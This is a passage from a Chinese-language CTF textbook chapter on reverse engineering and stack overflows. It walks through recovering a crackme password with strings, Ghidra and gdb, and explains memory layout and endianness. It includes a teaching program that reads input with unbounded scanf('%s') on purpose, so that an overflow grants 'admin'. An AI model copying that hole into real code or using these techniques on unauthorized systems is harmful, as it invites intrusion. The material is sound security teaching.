@@ -1,0 +1,1128 @@
+<!--meta
+title: 逆向工程與二進位攻防
+description: CTF 最硬核的兩類題:逆向工程(看懂沒有原始碼的程式)與 Pwn(利用記憶體漏洞控制程式)。本章由淺入深,用自編譯的教學題目,帶你走過 strings/objdump/Ghidra 靜態分析、gdb 動態分析、行程記憶體佈局與 stack frame、ret2win 緩衝區溢位、NX/ASLR/Canary/PIE 保護機制與 ret2libc、以及 pwntools 自動化——並把每一種攻擊對回它的防禦。立場:防禦、教育、授權(白帽),只在自己編譯的或獲授權的題目環境練習。
+-->
+
+
+      <div class="eyebrow">第十八部 · 實戰資安 CTF</div>
+      <h1>逆向工程與二進位攻防</h1>
+      <p class="subtitle">一個沒有原始碼的執行檔,在你眼前其實是一本沒有目錄、沒有變數名、用機器語言寫成的天書。而一塊只有 64 bytes 的緩衝區,卻可能成為攻擊者改寫整個程式「下一步去哪」的入口。這一章,我們戴上白帽,潛進二進位的最底層——學會像逆向工程師一樣讀懂機器,像 Pwn 玩家一樣看穿記憶體,然後,像工程師一樣把這些洞補起來。</p>
+      <div class="byline">
+        <span class="tag">第 72 章</span>
+        <span>閱讀時間 ≈ 75 分鐘</span>
+        <span>難度:★★★★★</span>
+      </div>
+
+      <div class="objectives">
+        <div class="o-title">📌 讀完這一章,你會知道</div>
+        <ul>
+          <li>逆向工程(reverse engineering)與 Pwn(二進位利用)是 CTF 最硬核的兩類題,它們都建立在你對機器底層的理解上(呼應<strong>第 21 章</strong>機器語言、<strong>第 24 章</strong>記憶體)</li>
+          <li>靜態分析三件套:<code>strings</code> 撈線索、<code>objdump</code> 看反組譯、Ghidra 反編譯回近似 C;以及動態分析:用 <code>gdb</code> 設斷點、看暫存器與記憶體</li>
+          <li>破解一個 crackme(找出通關密碼)的完整流程,順便複習 x86-64 的暫存器與呼叫慣例</li>
+          <li>行程的記憶體佈局(text / data / heap / stack),stack frame 裡的區域變數與<strong>返回位址</strong>,為什麼堆疊由高位址往低長,以及大小端(endianness)</li>
+          <li>緩衝區溢位 I——<strong>ret2win</strong>:如何算出偏移量(offset)、把返回位址改成隱藏的 <code>win()</code> 函式,並用 pwntools 寫出 exploit(教學題)</li>
+          <li>緩衝區溢位 II——現代防護 <strong>NX / ASLR / Stack Canary / PIE</strong> 各擋什麼,以及當 NX 擋住 shellcode 時的 <strong>ret2libc</strong> 與 ROP 概念</li>
+          <li>pwntools 自動化:為什麼用 Python 跟題目一問一答(<code>process</code> / <code>remote</code>、<code>recvuntil</code> / <code>sendline</code>、<code>p64</code> / <code>u64</code>)</li>
+          <li><strong>防禦視角</strong>:每一種攻擊,對應到一條具體的防禦——這正是「理解攻擊,才能防禦」(呼應<strong>第 36 章</strong>)</li>
+        </ul>
+      </div>
+
+      <h2>兩種最硬核的題:讀懂它,和控制它</h2>
+      <p>
+        前面幾章,我們在 CTF 的世界裡熱身過了:解過編碼、玩過密碼學、撈過封包。但每一場像樣的 CTF,
+        分數最高、賽到最後一刻還在被攻克的,幾乎總是這兩類題:<strong>逆向工程(Reverse Engineering,常簡稱 Rev)</strong>
+        與 <strong>Pwn(二進位利用,binary exploitation)</strong>。它們難,是因為它們<strong>沒有捷徑</strong>——
+        你必須真的理解一台電腦在最底層是怎麼運作的。
+      </p>
+      <p>
+        這兩類題,可以用兩個動詞分得清清楚楚。<strong>逆向,是「讀懂」</strong>:別人給你一個編譯好的執行檔,
+        沒有原始碼、沒有註解、連變數名都被剝光,你要逆著編譯的方向,把它還原成「人看得懂的邏輯」——
+        它在算什麼?通關密碼藏在哪?<strong>Pwn,是「控制」</strong>:程式裡有一個記憶體漏洞,
+        你要餵它一段精心設計的輸入,讓它去做<em>原作者從沒打算讓它做的事</em>——跳去執行一段隱藏的程式碼、甚至開出一個 shell。
+      </p>
+      <p>
+        你會發現,這一章其實是一場「回到底層」的大團圓。<strong>第 21 章</strong>我們親手讀懂過機器碼,
+        知道「指令也只是數字」、認得 CPU 的暫存器;<strong>第 24 章</strong>我們看清了行程的記憶體佈局、堆疊與堆積;
+        <strong>第 36 章</strong>我們從<em>防禦者</em>的角度,理解了緩衝區溢位為什麼能通往「任意程式碼執行」。
+        這一章,我們把鏡頭轉到<em>攻擊者</em>這一側——但目的始終如一:<strong>唯有親手走過攻擊的每一步,
+        你才會真正明白每一道防線在擋什麼。</strong>
+      </p>
+
+      <div class="callout danger">
+        <div class="ico">⛔</div>
+        <div class="body">
+          <span class="c-title">動筆之前,先把這條線畫清楚</span>
+          <p>這一章教你看穿二進位程式、利用記憶體漏洞。這些能力的<strong>正當用途只有兩個</strong>:
+          把你自己(與你受僱保護)的系統寫得更安全,以及在<strong>明確獲得授權</strong>的範圍內做安全測試。
+          本章<strong>所有</strong>範例,都是<strong>你自己用 <code>gcc</code> 編譯出來的小程式</strong>、或 CTF 平台
+          <strong>刻意提供給你練習</strong>的題目。未經授權去探測、攻擊任何不屬於你的系統,即使「只是看看」、
+          即使沒造成損害,在絕大多數司法管轄區都是<strong>犯罪</strong>。我們刻意只示範針對教學靶機的手法,
+          不提供能直接拿去打真實系統的完整武器。這條倫理與法律的界線,我們在<strong>第 41 章「倫理」</strong>
+          已經正式深入——請把它當成這一章的前提,而不是註腳。</p>
+        </div>
+      </div>
+
+      <h2>逆向工程入門:讀懂一本沒有目錄的天書</h2>
+      <p>
+        逆向的第一課,是接受一個有點殘酷的事實:<strong>編譯,是一道幾乎不可逆的門。</strong>
+        你寫的 C 原始碼裡,函式有名字、變數有意義、迴圈有結構;但 <code>gcc</code> 把它翻成機器碼之後,
+        這些「給人看的資訊」絕大部分都被丟掉了。剩下的,只是一長串 CPU 指令的位元組。
+        逆向工程師的工作,就是拿著這串位元組,把那些被丟掉的意義,一點一點<strong>推</strong>回來。
+      </p>
+
+      <h3>編譯後的程式,到底長什麼樣?</h3>
+      <p>
+        在 Linux 上,編譯出來的執行檔是 <strong>ELF(Executable and Linkable Format)</strong>格式。
+        它不是純粹的程式碼,而是一個有結構的檔案:裡面分成好幾個「節區(section)」——程式碼放在
+        <code>.text</code>、初始化過的全域變數放在 <code>.data</code>、字串常數放在 <code>.rodata</code>……
+        逆向的第一步,往往就是先認一認這個檔案的長相:
+      </p>
+      <pre><code class="language-bash"># 先確認這是什麼檔(看它的類型、位元數、有沒有被 strip 掉符號)
+$ file crackme
+crackme: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
+
+# 列出檔案裡所有可見的「節區」
+$ readelf -S crackme        # 你會看到 .text / .data / .rodata / .bss ...</code></pre>
+      <p>
+        這裡有個關鍵詞:<strong>stripped(被剝除符號)</strong>。如果一個執行檔「not stripped」,代表它還留著函式名、
+        變數名等符號資訊,逆向起來輕鬆很多;真實世界的惡意程式則幾乎都是 stripped 的,只剩光禿禿的位址。
+        CTF 的入門逆向題,通常善意地留著符號——但別習慣,難題會把這份善意收回去。
+      </p>
+
+      <h3>靜態分析:不執行它,光看就猜</h3>
+      <p>
+        <strong>靜態分析(static analysis)</strong>,是「在不執行程式的前提下」分析它。最快、最廉價的第一招,
+        是 <code>strings</code>——它把檔案裡所有「看起來像人類可讀字串」的位元組通通撈出來:
+      </p>
+      <pre><code class="language-bash">$ strings crackme | grep -i -E "pass|flag|correct|wrong"
+Enter password:
+Correct!
+Nope, wrong password.</code></pre>
+      <p>
+        運氣好的話,旗(flag)或密碼會直接躺在裡面,題目秒解。但好題目不會這麼天真——上面這個 crackme,
+        你看得到「Enter password:」「Correct!」這些提示語,<strong>卻看不到密碼,也看不到旗</strong>。
+        這是出題者刻意的反制:把秘密「藏起來,執行時才算出來」。這也帶出逆向的核心心法:
+        <strong>光靠 <code>strings</code> 不夠時,你得真的去讀程式的邏輯。</strong>
+      </p>
+      <p>
+        讀邏輯有兩個層次的工具。低階一點的是 <code>objdump</code>,把機器碼<strong>反組譯(disassemble)</strong>
+        成組合語言——這正是<strong>第 21 章</strong>那套「指令也只是數字」的逆操作:
+      </p>
+      <pre><code class="language-bash"># 反組譯,只看 main 附近(Intel 語法比較好讀)
+$ objdump -d -M intel crackme | less
+# 你會看到一連串像這樣的指令:
+#   mov    eax, DWORD PTR [rbp-0x4]
+#   xor    al, 0x10                  ← 咦?每個位元組都 XOR 0x10?
+#   cmp    ...
+#   call   strcmp</code></pre>
+      <p>
+        看到 <code>xor al, 0x10</code> 出現在一個迴圈裡、後面接著 <code>call strcmp</code>,有經驗的逆向者心裡就有譜了:
+        <strong>「正確密碼被 XOR 0x10 加密藏起來,程式執行時先解開,再跟你的輸入比對。」</strong>
+        這就是為什麼 <code>strings</code> 看不到明文——它在檔案裡是被 XOR 過的亂碼。
+      </p>
+      <p>
+        但純讀組合語言很燒腦。更高階的工具是<strong>反編譯器(decompiler)</strong>,最有名的免費選擇是 NSA 開源的
+        <strong>Ghidra</strong>(商業界則是 IDA Pro;命令列愛好者有 radare2)。它能把組合語言再往上推一層,
+        還原成<strong>近似的 C 程式碼</strong>。把 crackme 丟進 Ghidra 自動分析,找到 <code>main</code>,你會看到類似這樣的偽 C:
+      </p>
+      <pre><code class="language-c">/* Ghidra 反編譯 main 的(經整理的)結果 —— 變數名是工具自己編的 */
+int main(void) {
+    char input[64];
+    /* 一串寫死在程式裡的位元組:其實就是被加密的密碼 */
+    unsigned char enc[] = {0x62, 0x23, 0x66, 0x23, 0x62, 0x63, 0x21, 0x7e, 0x77, 0x00};
+    char pw[16];
+    int i;
+
+    for (i = 0; enc[i] != 0; i++)
+        pw[i] = enc[i] ^ 0x10;          /* ← 還原密碼:每個位元組 XOR 0x10 */
+    pw[i] = '\0';
+
+    printf("Enter password: ");
+    scanf("%15s", input);
+
+    if (strcmp(input, pw) == 0)          /* ← 比對的那一刻,pw 裡就是明文密碼 */
+        printf("Correct! FLAG{%s_unlocked_by_reversing}\n", pw);
+    else
+        printf("Nope, wrong password.\n");
+    return 0;
+}</code></pre>
+      <p>
+        邏輯一旦攤開,破解就是國中數學了:把那串 <code>enc</code> 的每個位元組各自 XOR <code>0x10</code>,就還原出密碼。
+        例如第一個 <code>0x62 ^ 0x10 = 0x72</code>,是字元 <code>'r'</code>;一路算下去,得到 <code>r3v3rs1ng</code>。
+        你也看懂了旗為什麼 <code>strings</code> 看不到——它是用 <code>printf("... FLAG{%s ...", pw)</code>
+        在<strong>執行時才組出來</strong>的,根本不以完整字串的形式存在於檔案裡。
+      </p>
+
+      <div class="callout tip">
+        <div class="ico">💡</div>
+        <div class="body">
+          <span class="c-title">逆向的「靜態」三件套</span>
+          <p><code>file</code>(這是什麼檔)→ <code>strings</code>(有沒有現成線索)→ <code>objdump</code> / Ghidra / radare2(讀邏輯)。
+          先用最便宜的招,撈不到再升級。記住:逆向高手不是「把每一條指令都讀懂」,而是<strong>知道該把注意力放在哪</strong>——
+          找到 <code>strcmp</code>、<code>if</code> 的判斷點、可疑的 <code>xor</code> / 迴圈,順著資料流走。</p>
+        </div>
+      </div>
+
+      <h3>動態分析:讓它跑,然後在關鍵時刻喊「定格」</h3>
+      <p>
+        靜態分析像看劇本;<strong>動態分析(dynamic analysis)</strong>則是看現場演出。
+        我們<strong>真的執行</strong>程式,但用<strong>除錯器(debugger)</strong>把它牢牢控制住——
+        最經典的就是 Linux 上的 <code>gdb</code>(CTF 圈常加掛 <code>pwndbg</code> 或 <code>gef</code> 外掛,介面更友善)。
+        除錯器最強大的能力,是<strong>斷點(breakpoint)</strong>:讓程式跑到某一行就「定格」,
+        此時你可以翻看所有暫存器、所有記憶體的當下內容。
+      </p>
+      <p>
+        對付上面這個 crackme,動態分析有一招近乎作弊的妙計:<strong>我根本不必看懂解密邏輯——
+        我只要在「比對的那一刻」把正確答案偷看出來就好。</strong>因為程式一定要把明文密碼算出來、
+        才能拿去 <code>strcmp</code> 比對,所以我在 <code>strcmp</code> 設個斷點,等它停下,直接讀它的參數:
+      </p>
+      <pre><code class="language-bash">$ gdb ./crackme
+(gdb) break strcmp        # 在「比對」這個函式被呼叫前斷下來
+(gdb) run
+Enter password: AAAA      # 隨便輸入,反正我們要的是「正確答案」,不是通過
+                          # ── 程式在 strcmp 前定格 ──
+(gdb) x/s $rsi            # 看 strcmp 的第二個參數(rsi 暫存器):正是程式算出的正確密碼
+0x7fffffffe2b0:  "r3v3rs1ng"</code></pre>
+      <p>
+        密碼 <code>r3v3rs1ng</code> 就這樣被「現行犯」抓住了。拿去換旗:
+      </p>
+      <pre><code class="language-bash">$ ./crackme
+Enter password: r3v3rs1ng
+Correct! FLAG{r3v3rs1ng_unlocked_by_reversing}</code></pre>
+
+      <div class="callout note">
+        <div class="ico">🧠</div>
+        <div class="body">
+          <span class="c-title">暫存器快速複習(呼應第 21 章)</span>
+          <p>看懂 <code>x/s $rsi</code> 為什麼能抓到答案,你得記得 x86-64 的「呼叫慣例(calling convention)」:
+          函式的前幾個參數,不是放在堆疊上,而是<strong>放在固定的暫存器</strong>裡——依序是
+          <code>rdi</code>(第 1 個)、<code>rsi</code>(第 2 個)、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>。
+          所以 <code>strcmp(input, pw)</code> 被呼叫時,<code>rdi</code> 指向你的輸入、<code>rsi</code> 指向正確密碼。
+          其他常客:<code>rax</code> 放回傳值與運算結果,<code>rsp</code> 是堆疊指標(指向堆疊頂),
+          <code>rbp</code> 是框架指標,<code>rip</code> 是指令指標(CPU 下一條要執行的指令位址)——
+          這個 <code>rip</code>,等一下會是整個 Pwn 故事的主角。</p>
+        </div>
+      </div>
+
+      <div class="diagram">
+<svg viewBox="0 0 720 300" xmlns="http://www.w3.org/2000/svg" font-family="Inter, 'Noto Sans TC', sans-serif">
+  <text x="360" y="26" text-anchor="middle" font-size="13" font-weight="800" fill="#1f2328">逆向的兩條路:靜態 vs 動態(互補)</text>
+
+  <!-- binary in the middle -->
+  <rect x="300" y="120" width="120" height="60" rx="10" fill="#1f2328" stroke="#000"/>
+  <text x="360" y="148" text-anchor="middle" font-size="12" font-weight="800" fill="#fff">crackme</text>
+  <text x="360" y="166" text-anchor="middle" font-size="10" fill="#cfe6e2">(無原始碼的 ELF)</text>
+
+  <!-- static -->
+  <rect x="30" y="60" width="230" height="180" rx="12" fill="#e3efed" stroke="#2f6f6a" stroke-width="2"/>
+  <text x="145" y="84" text-anchor="middle" font-size="12" font-weight="800" fill="#2f6f6a">靜態分析(不執行)</text>
+  <g font-size="11" fill="#4a5159">
+    <text x="48" y="110">• file —— 這是什麼檔?</text>
+    <text x="48" y="134">• strings —— 撈現成字串</text>
+    <text x="48" y="158">• objdump —— 反組譯成 asm</text>
+    <text x="48" y="182">• Ghidra —— 反編譯回近似 C</text>
+    <text x="48" y="212" font-size="10" fill="#8a929b">看劇本:看得到全貌,但要自己讀懂</text>
+  </g>
+
+  <!-- dynamic -->
+  <rect x="460" y="60" width="230" height="180" rx="12" fill="#f6e7dd" stroke="#b4541f" stroke-width="2"/>
+  <text x="575" y="84" text-anchor="middle" font-size="12" font-weight="800" fill="#b4541f">動態分析(讓它跑)</text>
+  <g font-size="11" fill="#4a5159">
+    <text x="478" y="110">• gdb —— 設斷點、單步</text>
+    <text x="478" y="134">• 看暫存器 $rdi/$rsi/$rip</text>
+    <text x="478" y="158">• 看記憶體 x/s、x/gx</text>
+    <text x="478" y="182">• 在 strcmp 抓「正確答案」</text>
+    <text x="478" y="212" font-size="10" fill="#8a929b">看現場:在關鍵那一刻定格偷看</text>
+  </g>
+
+  <line x1="260" y1="150" x2="298" y2="150" stroke="#2f6f6a" stroke-width="2" marker-end="url(#revA)"/>
+  <line x1="460" y1="150" x2="422" y2="150" stroke="#b4541f" stroke-width="2" marker-end="url(#revB)"/>
+  <defs>
+    <marker id="revA" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#2f6f6a"/></marker>
+    <marker id="revB" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#b4541f"/></marker>
+  </defs>
+</svg>
+        <figcaption>圖 72-1:逆向的兩條互補路徑。靜態分析像讀劇本(看得到全貌、但要自己讀懂);動態分析像看現場演出(在關鍵時刻定格、直接偷看記憶體與暫存器)。難題往往需要兩者交替使用。</figcaption>
+      </div>
+
+      <div class="callout warn">
+        <div class="ico">⚠️</div>
+        <div class="body">
+          <span class="c-title">逆向給程式設計師的一課:用戶端藏不住秘密</span>
+          <p>這個 crackme 把密碼「XOR 0x10 藏起來」,看起來很聰明,但對逆向者只是幾分鐘的工。
+          這帶出一條鐵律:<strong>任何「跑在使用者機器上」的程式裡的秘密,終究會被挖出來。</strong>
+          軟體授權碼、API 金鑰、前端寫死的密碼——只要程式碼在對方手上,混淆(obfuscation)只能<em>拖延</em>,不能<em>阻止</em>。
+          真正的秘密與驗證,必須留在你能控制的<strong>伺服器端</strong>(呼應<strong>第 36 章</strong>的「敏感資訊外洩」)。</p>
+        </div>
+      </div>
+
+      <div class="exercise">
+        <div class="ex-head">✏️ 練習 72.1 <span class="badge">實作</span></div>
+        <div class="ex-body">
+          <p>你拿到一個自己編譯的 crackme(就是上面那個)。請描述一條<strong>完整、最省力</strong>的破解路徑:
+          從你會下哪些指令,到你如何拿到密碼。要求至少示範「靜態撈線索」與「動態抓答案」兩種思路各一。</p>
+          <details class="solution">
+            <summary>看解答</summary>
+            <div class="sol-body">
+              <p><strong>路徑一(靜態,讀邏輯還原):</strong></p>
+              <pre><code class="language-bash">$ file crackme                 # 確認是 ELF 64-bit
+$ strings crackme | grep -i pass   # 只看到提示語,沒密碼 → 秘密被藏了
+# 用 Ghidra 開,看 main:發現一個 enc[] 位元組陣列被 for 迴圈 XOR 0x10 後拿去 strcmp
+# → 把 enc 每個位元組 XOR 0x10 還原:</code></pre>
+              <pre><code class="language-python">enc = [0x62,0x23,0x66,0x23,0x62,0x63,0x21,0x7e,0x77]
+print("".join(chr(b ^ 0x10) for b in enc))   # → r3v3rs1ng</code></pre>
+              <p><strong>路徑二(動態,直接偷看):</strong>不必看懂解密邏輯,只要在比對那一刻把正確答案讀出來:</p>
+              <pre><code class="language-bash">$ gdb ./crackme
+(gdb) break strcmp
+(gdb) run                      # 隨便輸入 AAAA
+(gdb) x/s $rsi                 # strcmp 第二參數 = 正確密碼 → "r3v3rs1ng"</code></pre>
+              <p>兩條路殊途同歸。動態那條尤其體現逆向的精髓:<strong>你不需要理解全部,只需要在對的位置、對的時刻,
+              讓程式把答案吐給你。</strong>最後 <code>./crackme</code> 輸入密碼即得旗。</p>
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <h2>記憶體與堆疊:Pwn 的地基</h2>
+      <p>
+        逆向讓你「讀懂」程式;接下來的 Pwn,要「控制」程式。但在動手之前,我們得先把舞台看清楚:
+        一個正在執行的程式(也就是<strong>行程,process</strong>),它的記憶體到底長什麼樣?
+        這部分<strong>第 24 章</strong>已經鋪墊過,這裡我們戴上攻擊者的眼鏡,重看一遍——因為 Pwn 的每一招,
+        都是在這張記憶體地圖上動手腳。
+      </p>
+
+      <h3>行程的記憶體佈局:一張由低到高的地圖</h3>
+      <p>
+        當作業系統把你的程式載入記憶體、開始執行,它會給這個行程一塊<strong>虛擬位址空間(virtual address space)</strong>。
+        這塊空間由低位址到高位址,大致分成幾個區域,各有各的脾氣:
+      </p>
+
+      <div class="diagram">
+<svg viewBox="0 0 720 460" xmlns="http://www.w3.org/2000/svg" font-family="Inter, 'Noto Sans TC', sans-serif">
+  <text x="360" y="26" text-anchor="middle" font-size="13" font-weight="800" fill="#1f2328">行程的記憶體佈局(典型 Linux x86-64)</text>
+
+  <!-- high addr label -->
+  <text x="610" y="58" font-size="11" fill="#8a929b">高位址 0x7fff...</text>
+  <text x="610" y="430" font-size="11" fill="#8a929b">低位址 0x400000</text>
+
+  <!-- stack -->
+  <rect x="120" y="52" width="380" height="70" fill="#f6e7dd" stroke="#b4541f" stroke-width="2"/>
+  <text x="310" y="80" text-anchor="middle" font-size="12" font-weight="800" fill="#b4541f">堆疊 Stack</text>
+  <text x="310" y="100" text-anchor="middle" font-size="10" fill="#4a5159">區域變數、返回位址、函式呼叫框架 —— 往低位址生長 ↓</text>
+
+  <!-- arrow stack grows down -->
+  <line x1="80" y1="60" x2="80" y2="130" stroke="#b4541f" stroke-width="2.5" marker-end="url(#mlA)"/>
+  <text x="40" y="98" font-size="10" fill="#b4541f">stack↓</text>
+
+  <!-- gap -->
+  <rect x="120" y="122" width="380" height="60" fill="#fafafa" stroke="#cfcfcf" stroke-dasharray="4 4"/>
+  <text x="310" y="156" text-anchor="middle" font-size="10" fill="#8a929b">(未使用的空間 —— 堆疊與堆積各自往中間長)</text>
+
+  <!-- heap -->
+  <rect x="120" y="182" width="380" height="64" fill="#ede9fe" stroke="#8b5cf6" stroke-width="2"/>
+  <text x="310" y="208" text-anchor="middle" font-size="12" font-weight="800" fill="#8b5cf6">堆積 Heap</text>
+  <text x="310" y="228" text-anchor="middle" font-size="10" fill="#4a5159">malloc / new 動態配置 —— 往高位址生長 ↑</text>
+
+  <!-- arrow heap grows up -->
+  <line x1="80" y1="246" x2="80" y2="186" stroke="#8b5cf6" stroke-width="2.5" marker-end="url(#mlB)"/>
+  <text x="40" y="220" font-size="10" fill="#8b5cf6">heap↑</text>
+
+  <!-- bss -->
+  <rect x="120" y="246" width="380" height="44" fill="#e3efed" stroke="#2f6f6a" stroke-width="2"/>
+  <text x="310" y="273" text-anchor="middle" font-size="11" font-weight="700" fill="#2f6f6a">.bss —— 未初始化的全域/靜態變數(歸零)</text>
+
+  <!-- data -->
+  <rect x="120" y="290" width="380" height="44" fill="#d6e8e5" stroke="#2f6f6a" stroke-width="2"/>
+  <text x="310" y="317" text-anchor="middle" font-size="11" font-weight="700" fill="#2f6f6a">.data —— 已初始化的全域/靜態變數</text>
+
+  <!-- rodata -->
+  <rect x="120" y="334" width="380" height="40" fill="#f3f4f6" stroke="#8a929b" stroke-width="2"/>
+  <text x="310" y="359" text-anchor="middle" font-size="11" font-weight="700" fill="#4a5159">.rodata —— 唯讀資料(字串常數)</text>
+
+  <!-- text -->
+  <rect x="120" y="374" width="380" height="54" fill="#1f2328" stroke="#000" stroke-width="2"/>
+  <text x="310" y="398" text-anchor="middle" font-size="12" font-weight="800" fill="#fff">.text —— 程式碼(機器指令)</text>
+  <text x="310" y="416" text-anchor="middle" font-size="10" fill="#cfe6e2">通常唯讀且可執行</text>
+
+  <defs>
+    <marker id="mlA" markerWidth="10" markerHeight="10" refX="5" refY="8" orient="auto"><path d="M0,0 L10,0 L5,8 Z" fill="#b4541f"/></marker>
+    <marker id="mlB" markerWidth="10" markerHeight="10" refX="5" refY="0" orient="auto"><path d="M0,8 L10,8 L5,0 Z" fill="#8b5cf6"/></marker>
+  </defs>
+</svg>
+        <figcaption>圖 72-2:行程記憶體佈局。程式碼(.text)在低位址、堆疊(stack)在高位址;堆疊往<strong>低</strong>位址生長,堆積(heap)往<strong>高</strong>位址生長,兩者朝中間的空白區延伸。Pwn 主要在 stack 與 heap 上動手腳;這一章聚焦最經典的 stack。</figcaption>
+      </div>
+
+      <h3>Stack frame:函式呼叫留下的腳印</h3>
+      <p>
+        Pwn 的主戰場,是<strong>堆疊(stack)</strong>。每當一個函式被呼叫,系統就在堆疊上替它劃出一塊
+        <strong>堆疊框架(stack frame)</strong>——這個函式的「私人辦公桌」,放它的區域變數、以及兩樣關鍵的「行政紀錄」。
+        函式結束(return)時,這塊框架就被收回。
+      </p>
+      <p>
+        這裡有個一開始很反直覺、但你必須牢牢記住的事實:<strong>堆疊是往「低位址」生長的。</strong>
+        也就是說,每呼叫一層新函式,堆疊頂(<code>rsp</code> 所指)就往<em>更小</em>的位址移動。
+        但<strong>陣列、緩衝區的寫入,卻是往「高位址」方向填的</strong>(<code>buf[0]</code>、<code>buf[1]</code>…… 位址遞增)。
+        這「一低一高」的方向差,正是緩衝區溢位能搆到返回位址的關鍵——我們馬上會看到。
+      </p>
+      <p>
+        一塊典型的 stack frame,從低位址到高位址,大致是這樣排的(以一個有 <code>char buf[64]</code> 的函式為例):
+      </p>
+
+      <div class="diagram">
+<svg viewBox="0 0 720 420" xmlns="http://www.w3.org/2000/svg" font-family="Inter, 'Noto Sans TC', sans-serif">
+  <text x="360" y="26" text-anchor="middle" font-size="13" font-weight="800" fill="#1f2328">vuln() 的 stack frame(放大看)</text>
+
+  <text x="540" y="60" font-size="11" fill="#8a929b">高位址 ↑</text>
+  <text x="540" y="392" font-size="11" fill="#8a929b">低位址 ↓</text>
+
+  <!-- caller frame -->
+  <rect x="160" y="50" width="320" height="40" fill="#eef0f2" stroke="#8a929b" stroke-width="2"/>
+  <text x="320" y="75" text-anchor="middle" font-size="11" fill="#4a5159">…呼叫者 main() 的框架(更高位址)…</text>
+
+  <!-- return address -->
+  <rect x="160" y="90" width="320" height="48" fill="#f6e7dd" stroke="#b4541f" stroke-width="2.5"/>
+  <text x="320" y="112" text-anchor="middle" font-size="12" font-weight="800" fill="#b4541f">返回位址 return address(8 bytes)</text>
+  <text x="320" y="129" text-anchor="middle" font-size="10" fill="#4a5159">vuln() return 後,CPU 要跳回的位址 ← Pwn 的目標!</text>
+
+  <!-- saved rbp -->
+  <rect x="160" y="138" width="320" height="40" fill="#ede9fe" stroke="#8b5cf6" stroke-width="2"/>
+  <text x="320" y="163" text-anchor="middle" font-size="11" font-weight="700" fill="#1f2328">存起來的 rbp(舊框架指標,8 bytes)</text>
+
+  <!-- buf -->
+  <rect x="160" y="178" width="320" height="150" fill="#e3efed" stroke="#2f6f6a" stroke-width="2"/>
+  <text x="320" y="206" text-anchor="middle" font-size="12" font-weight="800" fill="#2f6f6a">char buf[64]</text>
+  <text x="320" y="226" text-anchor="middle" font-size="10" fill="#4a5159">buf[0] 在低位址,buf[63] 在高位址</text>
+  <text x="320" y="300" text-anchor="middle" font-size="10" fill="#8a929b">← rsp(堆疊頂)大約在這附近</text>
+
+  <!-- write direction arrow (low to high, upward in this drawing) -->
+  <line x1="120" y1="320" x2="120" y2="95" stroke="#b4541f" stroke-width="2.5" marker-end="url(#sfA)"/>
+  <text x="60" y="200" font-size="10" fill="#b4541f">寫入 buf</text>
+  <text x="60" y="216" font-size="10" fill="#b4541f">的方向</text>
+  <text x="60" y="232" font-size="9" fill="#8a929b">(往高位址,</text>
+  <text x="60" y="246" font-size="9" fill="#8a929b">朝返回位址爬)</text>
+
+  <text x="360" y="360" text-anchor="middle" font-size="11" fill="#1f2328">offset = buf 大小(64) + 存起來的 rbp(8) = <tspan font-weight="800" fill="#b4541f">72</tspan></text>
+  <text x="360" y="382" text-anchor="middle" font-size="10" fill="#8a929b">寫到第 73 個 byte 起,蓋的就是返回位址</text>
+
+  <defs>
+    <marker id="sfA" markerWidth="10" markerHeight="10" refX="5" refY="0" orient="auto"><path d="M0,8 L10,8 L5,0 Z" fill="#b4541f"/></marker>
+  </defs>
+</svg>
+        <figcaption>圖 72-3:一個 stack frame 的剖面。最底下是區域變數 <code>buf[64]</code>,往上是「存起來的 rbp」(8 bytes),再往上就是「返回位址」(8 bytes)。要從 <code>buf[0]</code> 寫到返回位址,得先填滿 64 + 8 = 72 個 byte——這個數字就是 <strong>offset(偏移量)</strong>。</figcaption>
+      </div>
+
+      <h3>大小端:同一個數字,擺法不只一種</h3>
+      <p>
+        在動手寫 exploit 之前,還有一個小但致命的細節:<strong>位元組序(endianness,大小端)</strong>。
+        當你要把一個位址(比如 8 bytes 的 <code>0x0000000000401156</code>)寫進記憶體,該怎麼擺它的 8 個位元組?
+        x86-64 用的是<strong>小端序(little-endian)</strong>:<strong>最低位的位元組放在最低的位址</strong>。
+        所以 <code>0x401156</code> 在記憶體裡實際的位元組順序是:
+      </p>
+      <pre><code class="language-text">數值:   0x 00 00 00 00 00 40 11 56
+記憶體:  56 11 40 00 00 00 00 00       ← 低位址在左,反過來擺!</code></pre>
+      <p>
+        手動處理這個翻轉很容易出錯——幸好,pwntools 的 <code>p64()</code>(pack 64-bit)會自動幫你把一個整數
+        轉成正確的小端 8-byte 字串;反向的 <code>u64()</code>(unpack)則把讀回來的 8 個位元組還原成整數。
+        這對函式,等一下會是你寫 exploit 時最常打的兩個字。
+      </p>
+
+      <h3>用 gdb 親眼看溢位「蓋掉旁邊的變數」</h3>
+      <p>
+        理論講夠了,來看一個最小、最直觀的溢位現場。下面這支自編譯的教學程式 <code>stack_demo.c</code>,
+        用一個 <code>struct</code> 把 <code>buf</code> 和一個 <code>authenticated</code> 旗標<strong>綁在一起</strong>
+        (這樣能保證 <code>buf</code> 在前、<code>authenticated</code> 緊接在後,跨編譯器都可靠地相鄰):
+      </p>
+      <pre><code class="language-c">// stack_demo.c —— 看見「溢位蓋掉旁邊的變數」
+// 編譯:gcc -fno-stack-protector -o stack_demo stack_demo.c
+#include &lt;stdio.h&gt;
+
+int main(void) {
+    struct {
+        char buf[16];
+        int  authenticated;     // 緊接在 buf 後面(offset 16)
+    } s;
+    s.authenticated = 0;        // 一開始:沒有權限
+
+    printf("buf 位址          = %p\n", (void *)s.buf);
+    printf("authenticated 位址 = %p\n", (void *)&amp;s.authenticated);
+    printf("Enter your name: ");
+    scanf("%s", s.buf);         // ⚠️ %s 不限長度 → 可溢位
+
+    if (s.authenticated)        // 非 0 就「升級成 admin」
+        printf("Welcome admin! FLAG{stack_overflow_overwrote_the_variable}\n");
+    else
+        printf("一般使用者,無權限。\n");
+    return 0;
+}</code></pre>
+      <p>
+        <code>buf</code> 只有 16 bytes,而 <code>scanf("%s", ...)</code> 跟 <code>gets</code> 一樣<strong>完全不檢查長度</strong>
+        (這正是<strong>第 36 章</strong>點名的經典地雷)。正常輸入沒事;但只要輸入夠長,多出來的位元組就會
+        溢出 <code>buf</code>、寫進緊鄰的 <code>authenticated</code>:
